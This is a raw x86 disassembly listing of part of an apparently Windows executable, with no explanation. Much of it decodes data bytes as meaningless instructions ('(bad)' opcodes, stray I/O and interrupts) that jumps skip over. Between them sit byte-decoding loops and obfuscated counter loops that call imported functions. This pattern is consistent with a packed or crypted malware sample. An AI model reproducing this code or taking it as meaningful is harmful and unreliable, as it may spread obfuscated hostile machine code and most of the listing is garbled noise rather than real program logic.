  4029bf:	fdiv   DWORD PTR [edx]
  4029c1:	pop    ss
  4029c2:	and    al,0xab
  4029c4:	push   ecx
  4029c5:	dec    esp
  4029c6:	cmp    eax,0x42d4ce0d
  4029cb:	sbb    eax,0x15f5fa6e
  4029d0:	push   ebp
  4029d1:	mov    bh,BYTE PTR [eax+esi*8-0x684ff9dd]
  4029d8:	jmp    0x402a01
  4029da:	fadd   QWORD PTR [esi+0x6d]
  4029dd:	sbb    BYTE PTR [eax],0xcb
  4029e0:	or     ecx,DWORD PTR [ecx-0x1b89cb25]
  4029e6:	lahf   
  4029e7:	cmp    ah,BYTE PTR [edi]
  4029e9:	fcomp  QWORD PTR [edi]
  4029eb:	sbb    BYTE PTR [ebx+0x35],0x69
  4029ef:	jae    0x4029e8
  4029f1:	outs   dx,BYTE PTR ds:[esi]
  4029f2:	cmp    eax,0xb780cd24
  4029f7:	div    DWORD PTR [ebx]
  4029f9:	std    
  4029fa:	lahf   
  4029fb:	mov    WORD PTR [eax],ds
  4029fd:	es stos BYTE PTR es:[edi],al
  4029ff:	xchg   dx,ax
  402a01:	icebp  
  402a02:	push   edx
  402a03:	and    ebx,DWORD PTR [ecx-0xe]
  402a06:	push   0x2a
  402a08:	push   ebx
  402a09:	(bad)  
  402a0b:	jp     0x402a2f
  402a0d:	cmp    DWORD PTR [ebx],eax
  402a0f:	jge    0x402a21
  402a11:	xor    edx,ecx
  402a13:	add    edx,esi
  402a15:	cmp    edx,edi
  402a17:	ja     0x402e5d
  402a1d:	push   ebx
  402a1e:	jmp    0x402a28
  402a23:	mov    esi,0x32729b
  402a28:	mov    eax,DWORD PTR [ebp-0x8]
  402a2b:	mov    edi,DWORD PTR [ebp-0x4]
  402a2e:	jmp    0x402c26
  402a33:	lock ss inc eax
  402a36:	xor    al,0x40
  402a38:	jo     0x402aaa
  402a3a:	repnz push ss
  402a3c:	pop    ds
  402a3d:	mov    ds:0xcda04480,al
  402a42:	xchg   esp,eax
  402a43:	push   0x557e7e0c
  402a48:	jg     0x402ac8
  402a4a:	jle    0x402a00
  402a4c:	test   DWORD PTR [edi],ebp
  402a4e:	mov    esp,0xd234c559
  402a53:	push   esp
  402a54:	add    al,0xbc
  402a56:	mov    bh,0xb2
  402a58:	mov    edi,0xaa85466b
  402a5d:	mov    WORD PTR [esi+eiz*2+0x2c63ec42],?
  402a64:	sub    ebp,DWORD PTR [ecx+0x4c6e39f6]
  402a6a:	mov    ds:0x60a8969a,al
  402a6f:	call   0x67adf7d1
  402a74:	clc    
  402a75:	(bad)  
  402a77:	aas    
  402a78:	mov    edi,0xa058a1b2
  402a7d:	adc    bh,BYTE PTR [ebp-0x15]
  402a80:	jg     0x402a6e
  402a82:	icebp  
  402a83:	mov    esp,0x237ce28b
  402a88:	outs   dx,DWORD PTR ds:[esi]
  402a89:	retf   0x78b
  402a8c:	test   eax,0xf413f16c
  402a91:	push   edi
  402a92:	mov    ds:0x883c1aa9,eax
  402a97:	adc    BYTE PTR [eax+0x69],0x2
  402a9b:	inc    esp
  402a9c:	xor    esp,DWORD PTR [di-0x46b5]
  402aa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402aa2:	cmp    ebp,ecx
  402aa4:	or     DWORD PTR ds:0x9f08c096,esp
  402aaa:	clc    
  402aab:	xchg   edx,eax
  402aac:	push   edx
  402aad:	mov    bh,0x8f
  402aaf:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  402ab1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ab2:	(bad)  
  402ab4:	repz add BYTE PTR [bp+si-0xc],ch
  402ab9:	cmp    BYTE PTR [ecx-0x78],bl
  402abc:	sbb    BYTE PTR [esi],bh
  402abe:	inc    ebp
  402abf:	fadd   QWORD PTR [ebx-0x6c]
  402ac2:	std    
  402ac3:	jns    0x402abb
  402ac5:	jmp    0x402ae1
  402ac7:	or     BYTE PTR [esp+ecx*1+0x1c],al
  402acb:	sti    
  402acc:	mov    esi,0xc60010cc
  402ad1:	repnz shr BYTE PTR [edi+0x620e346e],cl
  402ad8:	sub    eax,0x5e44e8c9
  402add:	add    BYTE PTR [eax-0x67],bl
  402ae0:	dec    edi
  402ae1:	das    
  402ae2:	adc    bh,BYTE PTR [edi]
  402ae4:	lods   eax,DWORD PTR ds:[esi]
  402ae5:	xor    DWORD PTR [edx-0x5d],ebp
  402ae8:	outs   dx,DWORD PTR ds:[esi]
  402ae9:	mov    esp,0x88041f17
  402aee:	rcr    DWORD PTR [ebp+0x11c6330d],1
  402af4:	jb     0x402aee
  402af6:	mov    esp,0x25ed94c8
  402afb:	sub    DWORD PTR [edx-0x3c],eax
  402afe:	mov    ds:0xd3759a13,eax
  402b03:	mov    eax,0xc72839da
  402b08:	test   al,0xad
  402b0a:	mov    bl,0x5c
  402b0c:	or     al,0xb8
  402b0e:	loope  0x402b73
  402b10:	inc    esi
  402b11:	(bad)  
  402b12:	jg     0x402b74
  402b14:	test   eax,0x586a8ca1
  402b19:	in     eax,0xee
  402b1b:	cwde   
  402b1c:	pop    ds
  402b1d:	inc    ebp
  402b1e:	fisubr WORD PTR [eax-0x2ca9c28]
  402b24:	scas   al,BYTE PTR es:[edi]
  402b25:	dec    BYTE PTR ds:0x6b963cb
  402b2b:	push   edx
  402b2c:	test   BYTE PTR [eax-0x79],ch
  402b2f:	repz (bad) 
  402b31:	cli    
  402b32:	data16 mov cl,0x6c
  402b35:	cmc    
  402b36:	jno    0x402b98
  402b38:	fstp   TBYTE PTR [ebx]
  402b3a:	dec    eax
  402b3b:	rcr    DWORD PTR [edx],1
  402b3d:	outs   dx,BYTE PTR ds:[esi]
  402b3e:	fsubr  QWORD PTR [eax-0x69]
  402b41:	jg     0x402b4d
  402b43:	iret   
  402b44:	into   
  402b45:	jmp    0xabe7588e
  402b4a:	xchg   edx,eax
  402b4b:	retf   
  402b4c:	shl    BYTE PTR [ecx+0x15840a8f],cl
  402b52:	push   ebp
  402b53:	lahf   
  402b54:	dec    eax
  402b55:	xchg   edi,eax
  402b56:	stos   BYTE PTR es:[edi],al
  402b57:	or     eax,0x4605c0e
  402b5c:	sub    esi,DWORD PTR [ebp-0x3c7e017c]
  402b62:	and    BYTE PTR [ebx+ecx*4+0x5a5939a0],dh
  402b69:	jb     0x402b62
  402b6b:	jae    0x402b63
  402b6d:	sub    al,0xc3
  402b6f:	and    DWORD PTR [ebp+0x1ca31cd1],esi
  402b75:	(bad)  
  402b76:	fwait
  402b77:	mov    eax,ds:0x5fdf7bb2
  402b7c:	cli    
  402b7d:	in     al,dx
  402b7e:	loopne 0x402b74
  402b80:	xchg   BYTE PTR [eax*2+0x5a9ba669],bl
  402b87:	fcom   QWORD PTR [ebx-0x6562c497]
  402b8d:	sub    BYTE PTR [ebx+edi*1+0x7b],al
  402b91:	jmp    0x402b85
  402b93:	scas   al,BYTE PTR es:[edi]
  402b94:	dec    BYTE PTR [ecx+ebp*4]
  402b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b98:	das    
  402b99:	push   0xf7d2c394
  402b9e:	add    eax,0xf22d5f99
  402ba3:	sbb    eax,0x7e423c17
  402ba8:	in     al,dx
  402ba9:	dec    eax
  402baa:	test   bh,dl
  402bac:	mov    al,ds:0xb5882abc
  402bb1:	ficom  WORD PTR [ebx]
  402bb3:	out    dx,al
  402bb4:	bound  ecx,QWORD PTR [esi-0x58]
  402bb7:	push   eax
  402bb8:	xchg   esi,eax
  402bb9:	pusha  
  402bba:	test   al,0x2e
  402bbc:	lods   eax,DWORD PTR ds:[esi]
  402bbd:	push   ds
  402bbe:	hlt    
  402bbf:	inc    edi
  402bc0:	(bad)  
  402bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402bc3:	inc    eax
  402bc4:	jge    0x402b50
  402bc6:	imul   ecx,DWORD PTR [ebp+ebp*4-0x13],0x5d
  402bcb:	jb     0x402bf7
  402bcd:	adc    BYTE PTR [ebp-0x29],cl
  402bd0:	jnp    0x402bc3
  402bd2:	pop    es
  402bd3:	mov    esp,0xf6e9b10f
  402bd8:	jge    0x402b89
  402bda:	inc    eax
  402bdb:	push   esp
  402bdc:	je     0x402ba7
  402bde:	scas   al,BYTE PTR es:[edi]
  402bdf:	adc    ah,ah
  402be1:	test   BYTE PTR [edi+0xc],bl
  402be4:	mov    edx,0x734fb3d6
  402be9:	test   al,0x7a
  402beb:	(bad)  
  402bec:	mov    al,ds:0x2e84c8e9
  402bf1:	sbb    eax,0x106987fb
  402bf6:	cmp    ah,BYTE PTR [esi-0x6ef7d875]
  402bfc:	shl    BYTE PTR [esi],1
  402bfe:	xor    cl,BYTE PTR [ebp+0x1b]
  402c01:	sub    ah,BYTE PTR ds:0x986cdc57
  402c07:	out    0x13,al
  402c09:	xor    BYTE PTR [edi-0x736874ce],dh
  402c0f:	ja     0x402c43
  402c11:	push   ss
  402c12:	rol    BYTE PTR [edx],0x13
  402c15:	jae    0x402ba9
  402c17:	push   edi
  402c18:	outs   dx,BYTE PTR ds:[esi]
  402c19:	cmp    BYTE PTR [edi+0x7d8ca90b],ah
  402c1f:	ficomp DWORD PTR [eax-0x41]
  402c22:	nop
  402c23:	xor    BYTE PTR [ecx+ebp*2],ch
  402c26:	xor    edi,ecx
  402c28:	add    edi,esi
  402c2a:	mov    esi,DWORD PTR [ebp+0x8]
  402c2d:	imul   edi,edx
  402c30:	mov    ebx,DWORD PTR [ebp+0xc]
  402c33:	xor    eax,ecx
  402c35:	add    eax,edx
  402c37:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  402c3e:	mov    BYTE PTR [edi+esi*1],al
  402c41:	mov    eax,DWORD PTR [ebp-0x4]
  402c44:	xor    eax,ecx
  402c46:	lea    edx,[edx+eax*1+0x32729b]
  402c4d:	mov    eax,DWORD PTR [ebp-0x4]
  402c50:	xor    eax,ecx
  402c52:	mov    esi,0xffcd8d65
  402c57:	sub    esi,eax
  402c59:	jmp    0x402e51
  402c5e:	outs   dx,BYTE PTR ds:[esi]
  402c5f:	add    ebx,DWORD PTR [edi+0x6f72734e]
  402c65:	and    ebp,DWORD PTR [esi]
  402c67:	add    al,0x68
  402c69:	mov    dh,0x4e
  402c6b:	push   0xffffffc2
  402c6d:	cmp    eax,0x7e7e0a4f
  402c72:	push   ebp
  402c73:	jg     0x402cf3
  402c75:	jle    0x402c51
  402c77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c78:	retf   
  402c79:	sbb    eax,0xfb57aca1
  402c7e:	xchg   DWORD PTR [esi+0x56],eax
  402c81:	test   eax,0x77230fa7
  402c86:	adc    edx,DWORD PTR [esi+0x49]
  402c89:	pop    ebp
  402c8a:	ins    BYTE PTR es:[edi],dx
  402c8b:	jecxz  0x402ccd
  402c8d:	in     eax,dx
  402c8e:	fs scas eax,DWORD PTR es:[edi]
  402c90:	mov    ah,0xf5
  402c92:	push   ebx
  402c93:	jmp    0x402c33
  402c95:	dec    eax
  402c96:	retf   0x8b0d
  402c99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402c9a:	inc    ebp
  402c9b:	mov    cl,0x7c
  402c9d:	mov    esp,0x943aec57
  402ca2:	pushf  
  402ca3:	pop    edx
  402ca4:	loop   0x402cac
  402ca6:	sbb    eax,0xd47e1b59
  402cab:	test   eax,0x11f4b00d
  402cb0:	inc    edi
  402cb1:	pop    esp
  402cb2:	dec    ebx
  402cb3:	fst    QWORD PTR [edi]
  402cb5:	cmp    BYTE PTR [ecx+0x697a043],al
  402cbb:	mov    al,ds:0x7da7aff5
  402cc0:	mov    dh,0x17
  402cc2:	sbb    eax,0x3eedc30a
  402cc7:	clc    
  402cc8:	out    dx,al
  402cc9:	cmovl  ecx,esi
  402ccc:	(bad)  
  402ccd:	loop   0x402c97
  402ccf:	loopne 0x402c5b
  402cd1:	pop    ecx
  402cd2:	stos   BYTE PTR es:[edi],al
  402cd3:	xchg   edi,eax
  402cd4:	jg     0x402c66
  402cd6:	out    dx,eax
  402cd7:	sbb    al,0xca
  402cd9:	leave  
  402cda:	jp     0x402d1f
  402cdc:	popf   
  402cdd:	js     0x402d3f
  402cdf:	jmp    DWORD PTR [esi-0x24]
  402ce2:	adc    edx,edi
  402ce4:	xor    DWORD PTR [esi+0x47],esi
  402ce7:	sbb    eax,DWORD PTR [edx]
  402ce9:	shl    ebp,0x3e
  402cec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ced:	imul   eax,DWORD PTR [edx+eiz*1],0x3d
  402cf1:	fsub   QWORD PTR ss:[ebx+0x4d6c04f8]
  402cf8:	push   edi
  402cf9:	add    DWORD PTR [esi],esi
  402cfb:	adc    ecx,DWORD PTR [edx+0x3e]
  402cfe:	mov    bh,0x17
  402d00:	pusha  
  402d01:	and    al,0x65
  402d03:	cmp    eax,DWORD PTR [edx+esi*1+0x64ab8d86]
  402d0a:	cmp    edi,ebp
  402d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d0d:	clc    
  402d0e:	mov    ah,0x3f
  402d10:	sbb    dl,BYTE PTR [ecx-0x25]
  402d13:	(bad)  
  402d14:	fst    DWORD PTR [ebp+0x2678a21f]
  402d1a:	aaa    
  402d1b:	sbb    edx,DWORD PTR [ebx]
  402d1d:	dec    eax
  402d1e:	or     BYTE PTR [ecx+0x3e],0x9c
  402d22:	(bad)  
  402d23:	aad    0x34
  402d25:	into   
  402d26:	dec    esp
  402d27:	inc    edi
  402d28:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d29:	pop    es
  402d2a:	scas   eax,DWORD PTR es:[edi]
  402d2b:	dec    DWORD PTR [eax]
  402d2d:	popa   
  402d2e:	sti    
  402d2f:	clc    
  402d30:	jl     0x402cb3
  402d32:	jg     0x402d5b
  402d34:	rcl    DWORD PTR [edi],1
  402d36:	aam    0x2c
  402d38:	mov    ch,0xc1
  402d3a:	into   
  402d3b:	jo     0x402d94
  402d3d:	mov    esp,0xa28cf180
  402d42:	jmp    0x402d0f
  402d44:	push   ecx
  402d45:	or     esp,esp
  402d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d48:	and    al,0x7b
  402d4a:	lds    esp,FWORD PTR [edi-0x6c]
  402d4d:	cli    
  402d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d4f:	mov    ebx,0x8eea8c1
  402d54:	cli    
  402d55:	adc    eax,0xc642b29a
  402d5a:	lods   al,BYTE PTR ds:[esi]
  402d5b:	push   esp
  402d5c:	mov    ah,0xfb
  402d5e:	mov    DWORD PTR [ebx+0x29],ecx
  402d61:	nop
  402d62:	lds    eax,FWORD PTR [esi-0x5b]
  402d65:	out    dx,al
  402d66:	aam    0x59
  402d68:	es dec ecx
  402d6a:	xchg   esi,eax
  402d6b:	sbb    al,0x3f
  402d6d:	push   0x13
  402d6f:	push   esi
  402d70:	mov    ebp,0xef038443
  402d75:	arpl   WORD PTR [eax+0x53],di
  402d78:	or     al,0x98
  402d7a:	mov    edi,0xf4c2e938
  402d7f:	mov    dh,0xe7
  402d81:	out    dx,al
  402d82:	cmp    eax,0x9efb3d13
  402d87:	dec    edx
  402d88:	mov    edx,0xbf9a4546
  402d8d:	sub    ebp,DWORD PTR [edi+0x4c]
  402d90:	xchg   esp,eax
  402d91:	lahf   
  402d92:	and    eax,0xfe507a6d
  402d97:	test   DWORD PTR gs:[esi],edx
  402d9a:	xor    dl,BYTE PTR [edx+0x51]
  402d9d:	stos   BYTE PTR es:[edi],al
  402d9e:	add    al,0x74
  402da0:	retf   
  402da1:	out    dx,al
  402da2:	jl     0x402e1f
  402da4:	out    0x1f,al
  402da6:	inc    edx
  402da7:	sub    DWORD PTR [eax],esi
  402da9:	inc    eax
  402daa:	jae    0x402d8b
  402dac:	out    dx,al
  402dad:	sbb    eax,0x450b0594
  402db2:	cmp    eax,0xf715a712
  402db7:	jg     0x402d7b
  402db9:	dec    ecx
  402dba:	div    DWORD PTR [edx+0x2c]
  402dbd:	hlt    
  402dbe:	adc    al,0x24
  402dc0:	aam    0xaa
  402dc2:	fidivr DWORD PTR [ebp+0x377af65f]
  402dc8:	mov    ecx,eax
  402dca:	mov    bh,0xad
  402dcc:	inc    ebx
  402dcd:	xor    al,0x16
  402dcf:	or     DWORD PTR [ecx+0x3c8e107e],esp
  402dd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dd6:	dec    esp
  402dd7:	xor    esi,0xe4ba05b9
  402ddd:	(bad)  
  402dde:	cmp    eax,0x3854edb0
  402de3:	sub    BYTE PTR [edi+esi*8-0x13b0434d],bh
  402dea:	pushw  ss
  402dec:	adc    BYTE PTR ds:0xe53677f1,cl
  402df2:	pop    DWORD PTR [edx-0x5f]
  402df5:	jns    0x402e4d
  402df7:	mov    eax,ds:0x87e3118f
  402dfc:	stc    
  402dfd:	fmul   QWORD PTR [edx]
  402dff:	aas    
  402e00:	adc    eax,0xa7e0cf11
  402e05:	sahf   
  402e06:	jo     0x402e3e
  402e08:	lahf   
  402e09:	or     al,0xd
  402e0b:	mov    bl,al
  402e0d:	(bad)  
  402e0e:	cmc    
  402e0f:	jle    0x402dba
  402e11:	test   DWORD PTR [ebx-0x34ce5e0a],edx
  402e17:	mov    bl,BYTE PTR [eax-0x186a041b]
  402e1d:	pusha  
  402e1e:	dec    eax
  402e1f:	sti    
  402e20:	fsub   QWORD PTR [esi-0x2b]
  402e23:	push   ecx
  402e24:	jecxz  0x402de2
  402e26:	inc    edx
  402e27:	add    al,0xd3
  402e29:	lods   eax,DWORD PTR ds:[esi]
  402e2a:	(bad)  
  402e2c:	xor    al,0xc5
  402e2e:	pop    ecx
  402e2f:	scas   eax,DWORD PTR es:[edi]
  402e30:	add    cl,BYTE PTR [esi+0x7e]
  402e33:	mov    al,0x57
  402e35:	jns    0x402e2a
  402e37:	add    ecx,DWORD PTR [ebx]
  402e39:	or     ecx,DWORD PTR [esi*8+0x5afadecc]
  402e40:	push   esi
  402e41:	cmp    BYTE PTR [eax],bh
  402e43:	pop    esp
  402e44:	std    
  402e45:	dec    edi
  402e46:	xor    eax,0xe621b6
  402e4b:	clc    
  402e4c:	sub    ebx,eax
  402e4e:	push   0x75035e25
  402e53:	adc    BYTE PTR [ebx],bh
  402e55:	(bad)  
  402e56:	jbe    0x402a23
  402e5c:	pop    ebx
  402e5d:	mov    eax,0xf89c8532
  402e62:	pop    edi
  402e63:	pop    esi
  402e64:	leave  
  402e65:	ret    0xc
  402e68:	push   ebp
  402e69:	mov    ebp,esp
  402e6b:	sub    esp,0x58
  402e6e:	mov    ecx,DWORD PTR [ebp+0x8]
  402e71:	mov    eax,0x8a3c
  402e76:	xor    ax,WORD PTR [ecx+0x20]
  402e7a:	mov    ecx,0x3b02
  402e7f:	add    ax,cx
  402e82:	or     DWORD PTR ds:0x42e7d0,edi
  402e88:	movzx  eax,ax
  402e8b:	mov    ecx,DWORD PTR ds:0x430435
  402e91:	xor    ecx,DWORD PTR ds:0x42edd3
  402e97:	mov    DWORD PTR ds:0x430435,ecx
  402e9d:	mov    DWORD PTR [ebp-0xc],eax
  402ea0:	mov    BYTE PTR [ebp-0x1],0x7f
  402ea4:	sub    ecx,0x18d2
  402eaa:	lea    eax,[ebp-0x1]
  402ead:	and    DWORD PTR ds:0x42edef,0x0
  402eb7:	jmp    0x402ec9
  402ebc:	mov    ecx,DWORD PTR ds:0x42edef
  402ec2:	inc    ecx
  402ec3:	mov    DWORD PTR ds:0x42edef,ecx
  402ec9:	cmp    DWORD PTR ds:0x42edef,0x18
  402ed0:	jae    0x402fa2
  402ed6:	cmp    DWORD PTR ds:0x42edef,0x1a
  402edd:	jne    0x402eee
  402ee3:	push   0x2d42
  402ee8:	call   DWORD PTR ds:0x42ea9b
  402eee:	jmp    0x402ebc
  402ef3:	mov    DWORD PTR ds:0x42ede7,0x17
  402efd:	cmp    DWORD PTR ds:0x42ede7,0x0
  402f04:	je     0x402fa2
  402f0a:	cmp    DWORD PTR ds:0x42ede7,0x7
  402f11:	jne    0x402f2c
  402f17:	push   0x25f8
  402f1c:	push   0x430449
  402f21:	push   0x42e8b7
  402f26:	call   DWORD PTR ds:0x42e9b3
  402f2c:	cmp    DWORD PTR ds:0x42ede7,0x8
  402f33:	jne    0x402f48
  402f39:	xor    ecx,ecx
  402f3b:	or     ecx,DWORD PTR ds:0x42ede7
  402f41:	dec    ecx
  402f42:	mov    DWORD PTR ds:0x42ede7,ecx
  402f48:	mov    ecx,DWORD PTR ds:0x42ede7
  402f4e:	dec    ecx
  402f4f:	mov    DWORD PTR ds:0x42ede7,ecx
  402f55:	jmp    0x402efd
  402f5a:	and    DWORD PTR ds:0x42edcf,0x0
  402f64:	mov    ecx,DWORD PTR ds:0x42edcf
  402f6a:	inc    ecx
  402f6b:	mov    DWORD PTR ds:0x42edcf,ecx
  402f71:	cmp    DWORD PTR ds:0x42edcf,0x16
  402f78:	jne    0x402f8f
  402f7e:	push   DWORD PTR [ebp-0xc]
  402f81:	push   0x43046d
  402f86:	push   DWORD PTR [ebp-0x24]
  402f89:	call   DWORD PTR ds:0x42e9c7
  402f8f:	cmp    DWORD PTR ds:0x42edcf,0x10
  402f96:	jb     0x402f64
  402f9c:	add    DWORD PTR ds:0x42edcb,ebx
  402fa2:	mov    DWORD PTR [ebp-0x10],eax
  402fa5:	mov    DWORD PTR ds:0x430455,0x10
  402faf:	cmp    DWORD PTR ds:0x430455,0x0
  402fb6:	je     0x403010
  402fbc:	cmp    DWORD PTR ds:0x430455,0x4
  402fc3:	jne    0x402fda
  402fc9:	push   DWORD PTR [ebp-0x1c]
  402fcc:	push   DWORD PTR [ebp-0x20]
  402fcf:	push   0x42e82d
  402fd4:	call   DWORD PTR ds:0x42e9cb
  402fda:	cmp    DWORD PTR ds:0x430455,0x5
  402fe1:	jne    0x402ff4
  402fe7:	mov    ecx,DWORD PTR ds:0x430455
  402fed:	dec    ecx
  402fee:	mov    DWORD PTR ds:0x430455,ecx
  402ff4:	mov    ecx,DWORD PTR ds:0x430455
  402ffa:	dec    ecx
  402ffb:	mov    DWORD PTR ds:0x430455,ecx
  403001:	jmp    0x402faf
  403006:	and    DWORD PTR ds:0x43046d,0x3a0f
  403010:	mov    al,BYTE PTR [ebp-0x1]
  403013:	mov    ecx,DWORD PTR ds:0x42e7c0
  403019:	add    DWORD PTR ds:0x42edf3,ecx
  40301f:	mov    ecx,DWORD PTR [ebp-0x10]
  403022:	mov    DWORD PTR ds:0x4304db,0x1b71
  40302c:	xor    al,0x46
  40302e:	sub    al,0x38
  403030:	or     DWORD PTR ds:0x42e7c8,0x7677
  40303a:	mov    BYTE PTR [ecx],al
  40303c:	not    eax
  40303e:	jmp    0x40320b
  403043:	loop   0x40305e
  403045:	fcom   DWORD PTR [ebp+0x697355e1]
  40304b:	popf   
  40304c:	mov    DWORD PTR [ecx-0x48],ebp
  40304f:	cmp    al,0x6b
  403051:	test   eax,0x7e08a2b0
  403056:	jle    0x403006
  403058:	jg     0x4030d8
  40305a:	jle    0x402ff5
  40305c:	hlt    
  40305d:	pushf  
  40305e:	dec    ebp
  40305f:	xchg   ecx,eax
  403060:	sub    al,0xf6
  403062:	mov    edx,DWORD PTR [ecx+0xc]
  403065:	(bad)  
  403067:	fucomp st(2)
  403069:	cmp    eax,0xb1648522
  40306e:	call   0x8cd99a49
  403073:	sub    eax,0x38
  403076:	adc    edx,DWORD PTR [edx]
  403078:	cmp    esi,0xffffff90
  40307b:	mov    ecx,DWORD PTR [esp+esi*2+0x558da29d]
  403082:	test   eax,0x2192372f
  403087:	sahf   
  403088:	iret   
  403089:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40308a:	mov    eax,ds:0xa1f8a41f
  40308f:	vpsubusw ymm0,ymm5,YMMWORD PTR [eax+0x8]
  403094:	cmp    BYTE PTR [edx-0x17704618],ch
  40309a:	jmp    0xa4231ce9
  40309f:	push   es
  4030a0:	mov    ds:0xba5b174,eax
  4030a5:	jge    0x4030ee
  4030a7:	int3   
  4030a8:	scas   eax,DWORD PTR es:[edi]
  4030a9:	int3   
  4030aa:	daa    
  4030ab:	out    dx,eax
  4030ac:	lock or al,0x4b
  4030af:	push   es
  4030b0:	jge    0x403051
  4030b2:	add    dl,BYTE PTR cs:[edi]
  4030b5:	es test al,0x77
  4030b8:	ds clc 
  4030ba:	or     al,0x5f
  4030bc:	add    dh,BYTE PTR [eax+0x60]
  4030bf:	sti    
  4030c0:	es jecxz 0x40312c
  4030c3:	mov    bh,0x2b
  4030c5:	cmp    BYTE PTR [edi+0x3960c5c],cl
  4030cb:	je     0x403125
  4030cd:	and    BYTE PTR [edx],ah
  4030cf:	inc    esp
  4030d0:	ins    BYTE PTR es:[edi],dx
  4030d1:	xchg   esp,eax
  4030d2:	ins    DWORD PTR es:[edi],dx
  4030d3:	leave  
  4030d4:	jne    0x403063
  4030d6:	push   0xffffff96
  4030d8:	shl    DWORD PTR [eax+0x3ca730df],cl
  4030de:	cli    
  4030df:	mov    bl,0x34
  4030e1:	into   
  4030e2:	sar    BYTE PTR [eax+0x59768080],1
  4030e8:	xchg   ebp,eax
  4030e9:	mov    BYTE PTR [esp+ecx*4-0xc],cl
  4030ed:	cs sti 
  4030ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030f0:	inc    esi
  4030f1:	inc    edx
  4030f2:	mov    ebx,0x230a1ccd
  4030f7:	(bad)  
  4030f8:	imul   esp,DWORD PTR [edi-0x4e],0x466734b4
  4030ff:	loope  0x403125
  403101:	cmp    DWORD PTR [eax+0x1d],0x50a1b73f
  403108:	inc    edi
  403109:	in     eax,0xbd
  40310b:	in     al,dx
  40310c:	aas    
  40310d:	sbb    bh,cl
  40310f:	inc    ecx
  403110:	pop    ss
  403111:	mov    eax,DWORD PTR [ebp-0x61]
  403114:	mov    ss,WORD PTR [edi]
  403116:	in     al,dx
  403117:	gs or  al,0xfa
  40311a:	cli    
  40311b:	adc    ebp,esp
  40311d:	out    0x88,eax
  40311f:	fxtract 
  403121:	mov    dh,0xda
  403123:	int3   
  403124:	pop    esi
  403125:	cmp    DWORD PTR [eax+0x3fd58ed1],esi
  40312b:	jns    0x403152
  40312d:	fild   DWORD PTR [esi]
  40312f:	pop    eax
  403130:	test   al,0x42
  403132:	loopne 0x403125
  403134:	adc    al,0x2
  403136:	cmc    
  403137:	sub    DWORD PTR [ebx-0x3aeee152],edi
  40313d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40313e:	ss or  eax,0x14885cf9
  403144:	int3   
  403145:	dec    ecx
  403146:	mov    dh,0x26
  403148:	fcom   DWORD PTR [edx-0x7950fe48]
  40314e:	fwait
  40314f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403150:	int    0xf4
  403152:	or     eax,0x13cae851
  403157:	sub    eax,0xb6a3fc9f
  40315c:	push   eax
  40315d:	repz stc 
  40315f:	mov    esi,0x62c6c7ca
  403164:	arpl   WORD PTR [ebx+0x14082eac],sp
  40316a:	mov    ch,0x93
  40316c:	cmp    ecx,ecx
  40316e:	cmp    dh,BYTE PTR [edx+0x77]
  403171:	imul   ecx,DWORD PTR [ebx+0x65],0xffffff9e
  403175:	iret   
  403176:	inc    esp
  403177:	xchg   ebp,ebp
  403179:	lods   al,BYTE PTR ds:[esi]
  40317a:	pop    esp
  40317b:	xor    ch,0x2
  40317e:	sub    ecx,edx
  403180:	enter  0x734e,0xb6
  403184:	xchg   esi,eax
  403185:	les    ecx,FWORD PTR [edi-0x6e]
  403188:	or     esi,0x77
  40318b:	sub    ebx,edx
  40318d:	out    dx,eax
  40318e:	jb     0x4031bc
  403190:	test   BYTE PTR [ebx+esi*4+0x27c1eaca],dh
  403197:	es dec ebp
  403199:	ficom  DWORD PTR [eax-0x14d66846]
  40319f:	dec    esp
  4031a0:	shl    esi,1
  4031a2:	sub    BYTE PTR [edi-0xa],bh
  4031a5:	ret    
  4031a6:	or     edx,ebx
  4031a8:	push   cs
  4031a9:	(bad)  
  4031aa:	xchg   edx,eax
  4031ab:	aad    0xe4
  4031ad:	mov    BYTE PTR [edx-0x34f89a30],dl
  4031b3:	xchg   edx,eax
  4031b4:	fnsave [ebp+ebp*2-0x12]
  4031b8:	push   ebx
  4031b9:	dec    ebp
  4031ba:	ror    BYTE PTR [edi-0x3966e29f],0x8d
  4031c1:	and    eax,0xdb4aafc1
  4031c6:	xchg   esp,eax
  4031c7:	inc    eax
  4031c8:	pop    ebx
  4031c9:	xchg   ecx,eax
  4031ca:	pop    esi
  4031cb:	icebp  
  4031cc:	lock jl 0x4031cb
  4031cf:	sbb    ch,cl
  4031d1:	clc    
  4031d2:	repnz cmp DWORD PTR [edi-0x897dc34],ebp
  4031d9:	outs   dx,BYTE PTR ds:[esi]
  4031da:	(bad)  
  4031db:	mov    cl,0xd1
  4031dd:	adc    BYTE PTR [edx+0x6f],dh
  4031e0:	or     al,0x1f
  4031e2:	pop    es
  4031e3:	pop    edx
  4031e4:	cmp    BYTE PTR [edx],ch
  4031e6:	shl    esi,1
  4031e8:	mov    eax,ds:0x71b50b78
  4031ed:	out    dx,eax
  4031ee:	enter  0xc68b,0x79
  4031f2:	outs   dx,BYTE PTR ds:[esi]
  4031f3:	xchg   edi,eax
  4031f4:	jnp    0x403257
  4031f6:	pop    ebp
  4031f7:	pop    edi
  4031f8:	pop    ds
  4031f9:	mov    ecx,DWORD PTR ds:0x8f398301
  4031ff:	add    dh,BYTE PTR [edi]
  403201:	je     0x403227
  403203:	js     0x4031b5
  403205:	inc    esi
  403206:	aad    0x5f
  403208:	jns    0x4031fe
  40320a:	loopne 0x4031d3
